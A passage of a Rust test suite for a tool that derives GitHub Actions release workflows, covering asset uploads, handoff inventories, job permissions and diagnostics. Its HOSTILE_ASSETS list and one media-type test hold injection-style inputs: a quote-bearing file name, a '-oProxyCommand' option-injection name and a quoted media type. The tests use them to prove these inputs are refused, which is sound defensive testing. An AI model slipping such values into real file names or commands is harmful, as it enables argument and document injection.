        let served = std::fs::read_to_string(inventory.root().join("assets"))
            .expect("the draft served an inventory")
            .lines()
            .map(|row| {
                let mut fields = row.split('\t');
                let name = fields.next().expect("an asset name").to_owned();
                (
                    name,
                    (
                        fields.next().expect("an identifier").to_owned(),
                        fields.next().expect("a size").to_owned(),
                        fields.next().expect("a media type").to_owned(),
                    ),
                )
            })
            .collect::<BTreeMap<_, _>>();

        let handoff = written_handoff(&runner, "component_package_homebrew_primary");
        // The inventory's heterogeneity is load-bearing rather than incidental.
        // If every asset agreed on its size, or on its media type, a document
        // that recorded one asset's value against another's name would read as
        // correct below. Asserting it here keeps a later fixture edit from
        // quietly retiring those comparisons.
        assert_eq!(
            handoff
                .assets
                .iter()
                .map(|asset| asset.size)
                .collect::<BTreeSet<_>>()
                .len(),
            handoff.assets.len(),
            "no two inventoried assets share a size: {:?}",
            handoff.assets
        );
        assert!(
            handoff
                .assets
                .iter()
                .map(|asset| asset.media_type.as_str())
                .collect::<BTreeSet<_>>()
                .len()
                > 1,
            "the inventoried assets do not all share one media type: {:?}",
            handoff.assets
        );
        assert_eq!(handoff.identity(), "component/package/homebrew/primary");
        assert_eq!(handoff.repository, REPOSITORY_IDENTITY);
        assert_eq!(handoff.release_id.to_string(), UPLOAD_RELEASE_ID);
        assert_eq!(handoff.global_tag, UPLOAD_TAG);
        assert_eq!(handoff.source_commit, UPLOAD_SOURCE);
        assert_eq!(handoff.release_commit, UPLOAD_RELEASE);
        assert_eq!(handoff.plan_digest, UPLOAD_PLAN_DIGEST);
        assert_eq!(
            handoff
                .assets
                .iter()
                .map(|asset| asset.name.as_str())
                .collect::<Vec<_>>(),
            CONSUMED_ASSETS,
            "a Homebrew publication resolves the archives its formula points at, not the system packages"
        );

        // The digest the handoff seals is the one taken from the bytes this job
        // uploaded, which is what makes the consumer's download a proved round
        // trip rather than agreement with whatever the Release now holds.
        for asset in &handoff.assets {
            let contents = GO_DISTRIBUTION
                .iter()
                .find(|(relative, _)| relative.ends_with(&asset.name))
                .map(|(_, contents)| *contents)
                .unwrap_or_else(|| panic!("{} is a staged deliverable", asset.name));
            assert_eq!(
                asset.sha256,
                crate::evidence::digest_bytes(contents.as_bytes()),
                "{} is sealed under the bytes the build produced",
                asset.name
            );
            let (id, size, media) = served
                .get(&asset.name)
                .unwrap_or_else(|| panic!("{} is an asset of the draft", asset.name));
            assert_eq!(
                (
                    asset.id.to_string(),
                    asset.size.to_string(),
                    asset.media_type.clone()
                ),
                (id.clone(), size.clone(), media.clone()),
                "{} is inventoried as the draft serves it",
                asset.name
            );
            assert_eq!(asset.size, contents.len() as u64, "{}", asset.name);
        }

        let arch = written_handoff(&runner, "component_package_aur_primary");
        assert_eq!(arch.identity(), "component/package/aur/primary");
        assert_eq!(
            arch.assets
                .iter()
                .map(|asset| asset.name.as_str())
                .collect::<Vec<_>>(),
            CONSUMED_ASSETS,
        );
    }

    // `immutable-github-release` states that a failure before closure leaves a
    // resumable draft, so a rerun has to place its deliverables onto a draft
    // that already carries some or all of them. The rerun is a new runner with
    // an empty scratch directory against the same Release, which is what a
    // re-run job on GitHub is.
    #[test]
    fn places_its_deliverables_again_on_a_draft_that_already_carries_them() {
        let workspace = go_workspace("workflow-upload-rerun");
        converge(workspace.root(), WorkflowRole::Publish);
        let inventory = Workspace::new("workflow-upload-rerun-inventory");
        let assets = inventory.root().join("assets");

        let first = upload_runner("workflow-upload-rerun-first", &assets);
        let initial = run_upload_job(workspace.root(), &first);
        assert!(
            initial.succeeded,
            "the first attempt places the deliverables: {}",
            initial.diagnostics
        );

        let second = upload_runner("workflow-upload-rerun-second", &assets);
        let repeated = run_upload_job(workspace.root(), &second);
        assert!(
            repeated.succeeded,
            "a rerun against a draft that already carries its assets succeeds: {}",
            repeated.diagnostics
        );
        assert_eq!(
            written_handoff(&first, "component_package_homebrew_primary"),
            written_handoff(&second, "component_package_homebrew_primary"),
            "the rerun hands off the same inventory rather than a second one"
        );
    }

    /// Execute the upload job with one stub setting replaced.
    fn refused_upload(label: &str, key: &str, value: &str) -> Executed {
        let workspace = go_workspace(label);
        converge(workspace.root(), WorkflowRole::Publish);
        let inventory = Workspace::new(&format!("{label}-inventory"));
        let runner = upload_runner(&format!("{label}-runner"), &inventory.root().join("assets"))
            .setting(key, value);
        run_upload_job(workspace.root(), &runner)
    }

    // Every refusal in this job reports what it refused. A privileged step that
    // exits non-zero with an empty log is the one case an operator has to
    // diagnose under time pressure, and the three states below are the ones a
    // wrong or missing draft arrives in. Each is refused before any asset is
    // written, because an upload onto a published Release cannot be undone and
    // an upload onto another tag's draft is bytes the release never sealed.
    #[test]
    fn refuses_a_draft_it_could_not_resolve_and_says_which_state_it_found() {
        for (label, key, value, expected) in [
            (
                "workflow-upload-published",
                "GH_STUB_DRAFT",
                "false",
                "no longer a draft",
            ),
            (
                "workflow-upload-other-tag",
                "GH_STUB_TAG",
                "component/staged@9.9.9",
                "carries tag component/staged@9.9.9",
            ),
            (
                "workflow-upload-unresolved",
                "GH_STUB_RESOLVES",
                "no",
                "could not be resolved",
            ),
        ] {
            let executed = refused_upload(label, key, value);
            assert!(
                !executed.succeeded,
                "{label} stops the job: {}",
                executed.invocations
            );
            assert!(
                executed.diagnostics.contains(expected),
                "{label} reports its cause: {:?}",
                executed.diagnostics
            );
            assert!(
                !executed.invocations.contains("release upload"),
                "{label} refuses before any asset is written: {}",
                executed.invocations
            );
        }
    }

    /// Deliverable names this release cannot carry, and what each one reaches.
    ///
    /// A name is a basename of whatever the packager wrote, and GoReleaser
    /// builds its filenames from a repository-controlled `name_template`, so
    /// each of these is a value the repository chooses in all but spelling.
    ///
    /// They are listed separately because they are separate claims reaching
    /// separate sinks. The quote closes the handoff's YAML scalar; the leading
    /// hyphen is an option rather than a name wherever the value reaches an
    /// argument vector, which is every `gh` invocation that places it. A rule
    /// written as one pattern is still several guarantees, and only a witness
    /// each can tell which of them is still standing.
    const HOSTILE_ASSETS: [(&str, &str); 3] = [
        (
            "example-tool_1.0.0\"_linux_amd64.tar.gz",
            "a quote closes the handoff scalar the name is written into",
        ),
        (
            "-oProxyCommand.tar.gz",
            "a leading hyphen is an option rather than a name on the command line that places it",
        ),
        (
            ".example-tool_1.0.0_linux_amd64.tar.gz",
            "a leading dot is not a Release asset a consumer resolves",
        ),
    ];

    // The handoff is emitted by a shell writer that prints each scalar between
    // double quotes, so a name carrying a quote emits a document its consumer
    // cannot parse. Refusing it in the handoff step would be too late: the
    // upload has already spent the job's `contents: write` by then and the draft
    // carries an asset no handoff can name. The refusal is therefore in the
    // placing step, before the first byte reaches the Release.
    #[test]
    fn refuses_every_deliverable_name_this_release_cannot_carry_before_placing_it() {
        let workspace = go_workspace("workflow-upload-hostile-name");
        converge(workspace.root(), WorkflowRole::Publish);

        for (index, (hostile, reaches)) in HOSTILE_ASSETS.into_iter().enumerate() {
            let inventory = Workspace::new(&format!("workflow-upload-hostile-{index}-inventory"));
            let runner = upload_runner(
                &format!("workflow-upload-hostile-{index}-runner"),
                &inventory.root().join("assets"),
            );
            std::fs::write(
                runner
                    .temp()
                    .join("intentional_subject/intentional_subject-component_goreleaser/bytes")
                    .join(hostile),
                "an archive named by a template",
            )
            .expect("the packager wrote the name it was told to");

            let (script, environment) = upload_scripts(workspace.root(), &runner)
                .into_iter()
                .find(|(script, _)| script.contains("gh release upload"))
                .expect("the job places deliverables");
            let executed = runner.execute(&script, &environment);

            assert!(
                !executed.succeeded,
                "{hostile:?} is refused, because {reaches}: {}",
                executed.invocations
            );
            assert!(
                !executed.invocations.contains("release upload"),
                "nothing is placed before {hostile:?} is refused: {}",
                executed.invocations
            );
            assert!(
                executed.diagnostics.contains("Release asset name"),
                "the refusal of {hostile:?} names what it refused: {:?}",
                executed.diagnostics
            );
        }
    }

    // The media type is GitHub's rather than the packager's, and it reaches the
    // same double-quoted scalar. A draft serving one the document cannot carry
    // fails the job rather than leaving a handoff its consumer rejects three
    // jobs later, naming the publisher instead of the transport.
    #[test]
    fn refuses_a_media_type_the_handoff_document_could_not_carry() {
        let workspace = go_workspace("workflow-upload-hostile-media");
        converge(workspace.root(), WorkflowRole::Publish);
        let inventory = Workspace::new("workflow-upload-hostile-media-inventory");
        let runner = upload_runner(
            "workflow-upload-hostile-media-runner",
            &inventory.root().join("assets"),
        )
        .setting("GH_STUB_MEDIA", "application/gzip\"");

        let executed = run_upload_job(workspace.root(), &runner);
        assert!(
            !executed.succeeded,
            "the media type is refused: {}",
            executed.invocations
        );
        assert!(
            executed.diagnostics.contains("media type"),
            "the refusal names what it refused: {:?}",
            executed.diagnostics
        );
    }

    // A Release asset name is flat, so two subjects producing one basename would
    // place one over the other and the loser's handoff would inventory an
    // identifier holding the winner's bytes. Nothing about that is loud: the
    // upload succeeds, the inventory resolves, and the digests disagree at a
    // publisher. The ledger spans subjects for that reason, and this executes a
    // second subject whose archive collides with the first's.
    #[test]
    fn refuses_a_second_subject_that_places_a_release_asset_name_already_taken() {
        let workspace = go_workspace("workflow-upload-collision");
        converge(workspace.root(), WorkflowRole::Publish);
        let inventory = Workspace::new("workflow-upload-collision-inventory");
        let runner = upload_runner(
            "workflow-upload-collision-runner",
            &inventory.root().join("assets"),
        );

        let (script, environment) = upload_scripts(workspace.root(), &runner)
            .into_iter()
            .find(|(script, _)| script.contains("gh release upload"))
            .expect("the job places deliverables");
        let first = runner.execute(&script, &environment);
        assert!(
            first.succeeded,
            "the first subject places its deliverables: {}",
            first.diagnostics
        );

        let sibling = runner.temp().join("sibling/bytes");
        stage_subject(&sibling);
        let mut colliding = environment.clone();
        colliding.insert(
            "INTENTIONAL_SUBJECT".to_owned(),
            sibling.display().to_string(),
        );
        let second = runner.execute(&script, &colliding);
        assert!(
            !second.succeeded,
            "a second subject placing a taken name is refused: {}",
            second.invocations
        );
        assert!(
            second.diagnostics.contains("already places Release asset")
                && second.diagnostics.contains("checksums.txt"),
            "the refusal names the asset both subjects claim: {:?}",
            second.diagnostics
        );
    }

    // The handoff carries a release identity a downstream publisher proves
    // against its own checkout, so those identities have to be the ones
    // `intentional verify release-tag` proved. They reach the graph as outputs
    // of the job that ran that verification, and each output name is bound to
    // one the Action declares: an output projected from a name the Action does
    // not expose is empty on a runner and empty is what a handoff would carry.
    #[test]
    fn projects_the_verified_release_identities_the_upload_job_hands_off() {
        let workspace = go_workspace("workflow-verified-outputs");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());

        let steps = job_steps(&jobs, "intentional_verify_tag");
        let (verifier, action) = steps
            .iter()
            .find_map(|step| {
                let (name, _) = intentional_action(step)?;
                (name == "verify-release-tag")
                    .then(|| (step["id"].as_str().expect("the step is addressable"), name))
            })
            .expect("the verify job proves the tag through the published Action");
        let declared = action_outputs(&action);
        let projected = jobs[&Value::String("intentional_verify_tag".to_owned())]["outputs"]
            .as_mapping()
            .expect("the verify job projects what it proved")
            .iter()
            .map(|(key, value)| {
                (
                    key.as_str().expect("an output name").to_owned(),
                    value.as_str().expect("an output value").to_owned(),
                )
            })
            .collect::<BTreeMap<_, _>>();

        // Derived from the Action rather than written down, so an identity the
        // Action gains is projected the day it gains it instead of the day
        // somebody remembers this list.
        assert_eq!(
            projected.keys().cloned().collect::<BTreeSet<_>>(),
            declared,
            "the job projects exactly the identities its Action exposes"
        );
        for identity in ["global-tag", "plan-digest", "release-sha", "source-sha"] {
            assert!(
                projected.contains_key(identity),
                "the handoff declares {identity}, so the graph has to carry it"
            );
        }
        for (name, value) in &projected {
            assert_eq!(
                value,
                &format!("${{{{ steps.{verifier}.outputs.{name} }}}}"),
                "{name} is read from the step that proved it"
            );
            assert!(
                declared.contains(name),
                "{action} declares {name}, so the projection is not empty on a runner"
            );
        }
    }

    // A handoff that inventoried a subset would be indistinguishable at the
    // consumer from one whose publication legitimately consumes fewer assets,
    // so a deliverable the draft does not carry fails the job. The witness is a
    // draft whose inventory is missing what this publication consumes, which is
    // what a partially failed upload leaves behind.
    #[test]
    fn refuses_to_hand_off_a_deliverable_the_draft_does_not_carry() {
        let workspace = go_workspace("workflow-upload-absent-asset");
        converge(workspace.root(), WorkflowRole::Publish);
        let inventory = Workspace::new("workflow-upload-absent-inventory");
        let runner = upload_runner(
            "workflow-upload-absent-runner",
            &inventory.root().join("assets"),
        );

        // Every step but the upload runs, so the draft resolves and the handoff
        // is attempted against a Release carrying none of this subject's bytes.
        let mut executed = None;
        for (script, environment) in upload_scripts(workspace.root(), &runner) {
            if script.contains("gh release upload") {
                continue;
            }
            let attempt = runner.execute(&script, &environment);
            if !attempt.succeeded {
                executed = Some(attempt);
                break;
            }
        }
        let executed = executed.expect("the handoff step refuses an inventory without its assets");
        assert!(
            executed
                .diagnostics
                .contains("is not an asset of draft Release")
                && executed
                    .diagnostics
                    .contains("component/package/homebrew/primary"),
            "the refusal names the asset and the publication that could not retrieve it: {:?}",
            executed.diagnostics
        );
    }

    // The split between what the upload places and what each adapter consumes
    // is the packager's own, and only two of the four draft-dependent adapters
    // derive a publisher job today. The rule is therefore exercised directly,
    // over a staged distribution tree carrying every kind of file the packager
    // writes, so the two adapters whose jobs task 148 still refuses are covered
    // by the same evidence as the two that derive.
    #[test]
    fn selects_the_deliverables_each_adapter_places_and_consumes() {
        let staged = Workspace::new("deliverable-selection");
        let subject = staged.root().join("bytes");
        stage_subject(&subject);

        let placed = selected(
            &subject,
            crate::executor::steps::github_hosted_deliverables(Packager::GoReleaser)
                .expect("GoReleaser writes GitHub-hosted deliverables"),
            "",
        );
        assert_eq!(
            placed, PLACED_ASSETS,
            "the packager's own build metadata and its descriptors are not deliverables"
        );
        // The rule names three self-documents, so all three are staged. A tree
        // carrying one witnesses one exclusion and leaves the other two free to
        // be dropped, which is the same fixture shape that let a barrier, a
        // format mapping and a build dependency go unheld on this change.
        for document in ["artifacts.json", "metadata.json", "config.yaml"] {
            assert!(
                GO_DISTRIBUTION
                    .iter()
                    .any(|(relative, _)| *relative == document),
                "{document} is staged, so the exclusion that names it has a witness"
            );
            assert!(
                !placed.contains(&document.to_owned()),
                "{document} describes the packager's run rather than the release"
            );
        }

        // The formats come from the fixture's own packager configuration rather
        // than from a list this test also chose, so a derivation that stopped
        // reading the declaration cannot agree with the assertion by making both
        // sides name the same two formats.
        let workspace = go_workspace("deliverable-selection-declaration");
        let declared = crate::executor::goreleaser::read(&workspace.root().join("component"))
            .expect("the packager configuration is readable")
            .expect("the release unit declares one")
            .nfpm_formats;
        assert!(
            declared.len() > 2,
            "the fixture declares a format beyond the two the adapters distribute: {declared:?}"
        );
        assert!(
            declared.iter().any(|format| {
                crate::executor::goreleaser::nfpm_extension(format)
                    .is_some_and(|extension| extension != format)
            }),
            "the fixture declares a format whose package is not named after it, which is what makes the mapping load-bearing: {declared:?}"
        );

        for (publisher, expected) in [
            (
                PublisherKind::Rpm,
                vec!["example-tool-1.0.0.x86_64.rpm".to_owned()],
            ),
            (
                PublisherKind::Apt,
                vec!["example-tool_1.0.0_amd64.deb".to_owned()],
            ),
            (
                PublisherKind::Homebrew,
                CONSUMED_ASSETS.map(str::to_owned).to_vec(),
            ),
            (
                PublisherKind::Aur,
                CONSUMED_ASSETS.map(str::to_owned).to_vec(),
            ),
        ] {
            let consumed =
                crate::executor::steps::consumed_deliverables(publisher, "component", &declared)
                    .map_err(|refusal| refusal.message)
                    .unwrap_or_else(|message| panic!("{publisher}: {message}"))
                    .unwrap_or_else(|| panic!("{publisher} consumes a Release asset"));
            assert_eq!(
                selected(
                    &subject,
                    crate::executor::steps::github_hosted_deliverables(Packager::GoReleaser)
                        .expect("GoReleaser writes GitHub-hosted deliverables"),
                    &consumed,
                ),
                expected,
                "{publisher} retrieves what its consumer path resolves and nothing else"
            );
        }

        for registry in [PublisherKind::Npm, PublisherKind::Cargo, PublisherKind::Oci] {
            assert!(
                crate::executor::steps::consumed_deliverables(registry, "component", &declared)
                    .map_err(|refusal| refusal.message)
                    .expect("a registry publisher reads no declaration")
                    .is_none(),
                "{registry} resolves its subject from a registry"
            );
        }
    }

    // A native package the derivation cannot recognise would reach a descriptor
    // adapter's handoff as one of the release archives its formula resolves,
    // which is the disagreement the split exists to prevent. It is refused at
    // derivation instead, where the diagnostic names the format and the file the
    // author has to edit.
    #[test]
    fn refuses_an_nfpm_format_it_cannot_recognise_as_a_native_package() {
        let workspace = go_workspace("workflow-nfpm-unknown");
        workspace.write(
            "component/.goreleaser.yaml",
            &GORELEASER_CONFIG.replace("[ rpm, deb, apk, archlinux ]", "[ rpm, deb, msi ]"),
        );
        let comparison = compare_workflow(workspace.root(), WorkflowRole::Publish, None)
            .expect("comparison runs");

        assert_eq!(comparison.status, ComparisonStatus::Blocked);
        let diagnostic = comparison
            .diagnostics
            .iter()
            .find(|diagnostic| diagnostic.code == "nfpm-format-underived")
            .unwrap_or_else(|| panic!("the format is refused: {:?}", comparison.diagnostics));
        assert!(
            diagnostic.message.contains("\"msi\"")
                && diagnostic.path == Some("release-units.component".to_owned()),
            "the refusal names the format and where it was declared: {diagnostic:?}"
        );
    }

    /// Names the derived `find` predicates select from one staged subject.
    ///
    /// The predicates are run by `find` rather than reimplemented, because they
    /// are shell text the derivation splices and a Rust reimplementation would
    /// agree with itself while the emitted command did something else.
    /// Expected vectors use byte order, so the sort must ignore UTF-8 collation.
    fn selected(subject: &Path, deliverables: &str, consumed: &str) -> Vec<String> {
        let script = format!(
            "find \"$1\" -maxdepth 1 -type f {deliverables} {consumed} -print0 | LC_ALL=C sort -z | xargs -0 -n1 basename"
        );
        let output = std::process::Command::new("bash")
            .args(["-c", &script, "selection", &subject.display().to_string()])
            .output()
            .expect("the selection runs");
        assert!(output.status.success(), "the selection runs");
        String::from_utf8_lossy(&output.stdout)
            .lines()
            .map(str::to_owned)
            .collect()
    }

    /// The line numbers of every non-zero `exit` one shell body takes.
    ///
    /// A zero exit is a success path rather than a refusal, and asking it for a
    /// diagnostic would make the convention mean something it does not say.
    fn refusals(body: &str) -> Vec<usize> {
        body.lines()
            .enumerate()
            .filter(|(_, line)| {
                line.trim()
                    .strip_prefix("exit ")
                    .is_some_and(|status| status.trim() != "0" && !status.trim().is_empty())
            })
            .map(|(index, _)| index)
            .collect()
    }

    /// Whether one refusal writes to standard error inside its own branch.
    ///
    /// The walk stops at the statement that opened the branch, which is the
    /// first line indented less than the `exit` itself. That boundary is what
    /// makes this a pairing rather than a count: a message written anywhere else
    /// in the body -- above the branch, in a neighbouring branch, at the top of
    /// the script -- is outside the walk and does not answer for this refusal.
    fn reports_its_cause(body: &str, refusal: usize) -> bool {
        let lines = body.lines().collect::<Vec<_>>();
        let indent = |line: &str| line.len() - line.trim_start().len();
        let depth = indent(lines[refusal]);
        lines[..refusal]
            .iter()
            .rev()
            .take_while(|line| line.trim().is_empty() || indent(line) >= depth)
            .any(|line| line.contains(">&2"))
    }

    // One diagnostic convention across all three `gh`-driven Release writers.
    // A privileged step that exits non-zero with an empty log is the one case an
    // operator has to diagnose under time pressure, and a bare `test` under
    // `set -e` is exactly that.
    //
    // Each refusal is paired with a message in its own branch rather than
    // counted against the body's total. Two counts move independently: deleting
    // one refusal's message and adding an unrelated one at the top of the script
    // keeps them equal while the refusal exits with an empty log, which is the
    // failure this exists to remove. The swept totals are still exact, so a
    // refusal that stops being derived fails here rather than shrinking the
    // surface this claims to cover.
    #[test]
    fn reports_the_cause_of_every_refusal_in_the_release_writing_steps() {
        let workspace = go_workspace("workflow-release-writer-diagnostics");
        for role in WorkflowRole::ALL {
            converge(workspace.root(), role);
        }
        let mut swept = 0_usize;
        let mut paired = 0_usize;
        for (role, job) in [
            (WorkflowRole::Release, "intentional_release"),
            (WorkflowRole::Publish, UPLOAD_JOB),
            (WorkflowRole::Publish, "intentional_close_release"),
        ] {
            for step in managed_steps(workspace.root(), role)
                .into_iter()
                .find(|(id, _)| id == job)
                .unwrap_or_else(|| panic!("{job} is derived"))
                .1
            {
                let Some(body) = step["run"].as_str() else {
                    continue;
                };
                if !body.contains("gh ") {
                    continue;
                }
                swept += 1;
                let taken = refusals(body);
                assert!(
                    !taken.is_empty(),
                    "a `gh`-driven step of {job} refuses nothing at all: {body}"
                );
                for refusal in &taken {
                    assert!(
                        reports_its_cause(body, *refusal),
                        "the refusal on line {} of {job} exits with an empty log:\n{body}",
                        refusal + 1
                    );
                }
                paired += taken.len();
                for line in body.lines().map(str::trim) {
                    assert!(
                        !line.starts_with("test "),
                        "{job} refuses through a bare `test`, which exits with an empty log: {line}"
                    );
                }
            }
        }
        assert_eq!(
            swept, 7,
            "every `gh`-driven step of all three Release writers is swept"
        );
        assert_eq!(
            paired, 21,
            "every refusal those steps derive is paired, not only the ones a defect happens to reach"
        );
    }

    // A synthetic future pair keeps the generic refusal observable without
    // withholding either system-package recipe this fixture needs.
    #[test]
    fn refuses_a_publication_whose_maintained_recipe_is_not_derived() {
        let workspace = system_package_workspace("workflow-underived-future-pair");
        let config = Config::load(workspace.root()).expect("configuration loads");
        let publication = SelectedPublication {
            release_unit: "component".to_owned(),
            package: "package".to_owned(),
            publisher: PublisherKind::Oci,
            target: "future".to_owned(),
            destination: None,
            capability: Capability::GoApplication,
            packager: Packager::GoReleaser,
            components: Vec::new(),
            retrieval: CleanClientMode::Public,
            observation_deadline: None,
        };
        let result = crate::executor::steps::recipe_steps(&crate::executor::steps::RecipeContext {
            publication: &publication,
            unit: &config.release_units["component"],
            subject_identity: "example-tool",
            build_job: "intentional_build_component_goreleaser",
            working_directory: "component",
            observation: "observation.yml",
            work: "readback",
            delivery_namespace: "intentional",
            root: workspace.root(),
        });
        let refusal = match result {
            Ok(_) => panic!("a newly added pair without a recipe was derived"),
            Err(refusal) => refusal,
        };
        assert_eq!(refusal.code, "maintained-recipe-underived");
        assert!(refusal.message.contains("component/package/oci/future"));
        assert!(refusal.message.contains("no maintained oci recipe"));
    }

    /// Id the Dev Container Feature fixture names itself by.
    const FEATURE_ID: &str = "example-feature";

    /// A release unit that publishes one Dev Container Feature to GHCR.
    fn feature_workspace(label: &str) -> Workspace {
        let workspace = workspace_without_package(label);
        workspace
            .write(
                ".intentional/config.yml",
                &TWO_DESTINATION_CONFIG.replace(
                    "      dockerhub: { repository: example-owner/example-image }\n",
                    "",
                ),
            )
            .write(
                "component/devcontainer-feature.json",
                &format!(r#"{{"id":"{FEATURE_ID}","version":"1.2.3"}}"#),
            );
        workspace
    }

    /// One version boundary containing two independently packaged Features.
    fn two_package_feature_workspace(label: &str) -> Workspace {
        let workspace = workspace_without_package(label);
        workspace
            .write(
                ".intentional/config.yml",
                r#"$schema: https://intentional.foo/schemas/config.yml
contract: contract-2
workspace-tags:
  release:
    template: '{version}'
github:
  workflows:
    release: { path: .github/workflows/release.yml, gates: [ candidate_check ] }
    publish: { path: .github/workflows/publish.yml, gates: [ artifact_check ] }
release-units:
  component:
    path: component
    packages:
      first:
        path: first
        oci:
          ghcr: {}
      second:
        path: second
        oci:
          ghcr: {}
    tags:
      primary: { role: primary, template: '{id}@{version}', require-phase: after-publication }
"#,
            )
            .write(
                "component/first/devcontainer-feature.json",
                r#"{"id":"first-feature","version":"1.2.3"}"#,
            )
            .write(
                "component/second/devcontainer-feature.json",
                r#"{"id":"second-feature","version":"1.2.3"}"#,
            );
        workspace
    }

    #[test]
    fn derives_each_package_feature_as_its_own_subject() {
        let workspace = two_package_feature_workspace("workflow-package-subjects");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());
        assert_eq!(
            job_ids(&jobs, "intentional_publish_component_"),
            vec![
                "intentional_publish_component_first_oci_ghcr".to_owned(),
                "intentional_publish_component_second_oci_ghcr".to_owned(),
            ],
            "both package publications derive distinct jobs"
        );

        for (package, identity) in [("first", "first-feature"), ("second", "second-feature")] {
            let job = format!("intentional_publish_component_{package}_oci_ghcr");
            let identities = job_steps(&jobs, &job)
                .iter()
                .filter_map(|step| step["env"]["INTENTIONAL_SUBJECT_IDENTITY"].as_str())
                .map(str::to_owned)
                .collect::<Vec<_>>();
            assert_eq!(
                identities,
                vec![identity.to_owned()],
                "publication {package} carries its own package manifest identity"
            );
            for owner in [
                format!("intentional_build_component_{package}_devcontainer_cli"),
                job,
            ] {
                let working_directories = job_steps(&jobs, &owner)
                    .iter()
                    .filter_map(|step| step["working-directory"].as_str())
                    .map(str::to_owned)
                    .collect::<Vec<_>>();
                assert_eq!(
                    working_directories,
                    vec![format!("component/{package}")],
                    "{owner} invokes the packager from the package that owns its manifest"
                );
            }
        }
    }

    #[test]
    fn derives_package_permissions_for_both_sides_of_each_github_packages_route() {
        let workspace = two_destination_workspace("workflow-github-package-permissions");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());

        for role in ["publish", "verify"] {
            let ghcr = format!("intentional_{role}_component_package_oci_ghcr");
            assert_eq!(
                jobs[&Value::String(ghcr.clone())]["permissions"]["packages"].as_str(),
                Some(if role == "publish" { "write" } else { "read" }),
                "{ghcr} receives the package scope its side of the route requires"
            );

            let dockerhub = format!("intentional_{role}_component_package_oci_dockerhub");
            assert!(
                jobs[&Value::String(dockerhub.clone())]["permissions"]
                    .get("packages")
                    .is_none(),
                "{dockerhub} receives no GitHub Packages scope"
            );
        }
    }

    #[test]
    fn resolves_each_native_identity_from_its_declared_owner() {
        let workspace = two_package_feature_workspace("workflow-subject-owner-census");
        workspace
            .write(
                "component/first/package.json",
                r#"{"name":"package-node","version":"1.2.3"}"#,
            )
            .write(
                "component/first/Cargo.toml",
                "[package]\nname = \"package-crate\"\nversion = \"1.2.3\"\n",
            )
            .write(
                "component/first/Dockerfile",
                "FROM scratch\nLABEL org.opencontainers.image.title=\"package-image\"\n",
            )
            .write(
                "component/.goreleaser.yaml",
                "version: 2\nproject_name: release-project\n",
            )
            .write(
                "component/first/.goreleaser.yaml",
                "version: 2\nproject_name: package-project\n",
            );
        let config = Config::load(workspace.root()).expect("configuration loads");
        let unit = &config.release_units["component"];
        let package = &unit.packages["first"];
        let publication = |packager, capability| SelectedPublication {
            release_unit: "component".to_owned(),
            package: "first".to_owned(),
            publisher: crate::model::PublisherKind::Oci,
            target: "ghcr".to_owned(),
            destination: None,
            capability,
            packager,
            components: Vec::new(),
            retrieval: CleanClientMode::Public,
            observation_deadline: None,
        };

        for (packager, capability, expected) in [
            (Packager::Npm, Capability::NodePackage, "package-node"),
            (Packager::Cargo, Capability::RustCrate, "package-crate"),
            (Packager::Buildx, Capability::RunnableImage, "package-image"),
            (
                Packager::DevContainerCli,
                Capability::DevContainerFeature,
                "first-feature",
            ),
        ] {
            let owner = subject_directory(unit, package, packager);
            assert_eq!(owner, Path::new("component/first"));
            assert_eq!(
                subject_identity(workspace.root(), &owner, &publication(packager, capability))
                    .expect("package identity derives"),
                expected
            );
        }

        let owner = subject_directory(unit, package, Packager::GoReleaser);
        assert_eq!(owner, Path::new("component"));
        assert_eq!(
            subject_identity(
                workspace.root(),
                &owner,
                &publication(Packager::GoReleaser, Capability::GoApplication)
            )
            .expect("release-unit identity derives"),
            "release-project"
        );
    }

    #[test]
    fn names_every_package_owned_source_in_subject_identity_diagnostics() {
        let workspace = two_package_feature_workspace("workflow-subject-diagnostic-census");
        workspace
            .write(
                "component/first/package.json",
                r#"{"name":"invalid name","version":"1.2.3"}"#,
            )
            .write(
                "component/first/Cargo.toml",
                "[package]\nname = \"invalid.name\"\nversion = \"1.2.3\"\n",
            )
            .write(
                "component/first/Dockerfile",
                "FROM scratch\nLABEL org.opencontainers.image.title=\"invalid name\"\n",
            )
            .write(
                "component/first/devcontainer-feature.json",
                r#"{"id":"invalid name","version":"1.2.3"}"#,
            );
        let publication = |packager, capability| SelectedPublication {
            release_unit: "component".to_owned(),
            package: "first".to_owned(),
            publisher: crate::model::PublisherKind::Oci,
            target: "ghcr".to_owned(),
            destination: None,
            capability,
            packager,
            components: Vec::new(),
            retrieval: CleanClientMode::Public,
            observation_deadline: None,
        };
        let owner = Path::new("component/first");

        for (packager, capability, expected, rejected_root) in [
            (
                Packager::Npm,
                Capability::NodePackage,
                "component/first/package.json",
                "component/package.json",
            ),
            (
                Packager::Cargo,
                Capability::RustCrate,
                "component/first/Cargo.toml",
                "component/Cargo.toml",
            ),
            (
                Packager::Buildx,
                Capability::RunnableImage,
                "component/first/Dockerfile",
                "component/Dockerfile",
            ),
            (
                Packager::DevContainerCli,
                Capability::DevContainerFeature,
                "component/first/devcontainer-feature.json",
                "component/devcontainer-feature.json",
            ),
        ] {
            let error =
                subject_identity(workspace.root(), owner, &publication(packager, capability))
                    .expect_err("the invalid package-owned identity is refused");
            assert!(
                error.contains(expected),
                "the refusal names {expected}: {error}"
            );
            assert!(
                !error.contains(rejected_root),
                "the refusal does not invent {rejected_root}: {error}"
            );
        }

        let error = subject_identity(
            workspace.root(),
            Path::new("component/second"),
            &publication(Packager::Buildx, Capability::RunnableImage),
        )
        .expect_err("a package with no Dockerfile cannot supply an image identity");
        assert!(
            error.contains("component/second/Dockerfile"),
            "the missing-image refusal names the configured package path: {error}"
        );
        assert!(
            !error.contains("component/Dockerfile"),
            "the missing-image refusal does not invent a root manifest: {error}"
        );
    }

    #[test]
    fn names_the_package_manifest_that_cannot_supply_a_feature_identity() {
        let workspace = two_package_feature_workspace("workflow-package-subject-diagnostic");
        workspace.write(
            "component/second/devcontainer-feature.json",
            r#"{"version":"1.2.3"}"#,
        );
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("runs");
        let diagnostic = comparison
            .diagnostics
            .iter()
            .find(|diagnostic| diagnostic.code == "subject-identity-invalid")
            .expect("the missing package identity blocks derivation");
        assert_eq!(
            diagnostic.path.as_deref(),
            Some("release-units.component.packages.second")
        );
        assert!(
            diagnostic
                .message
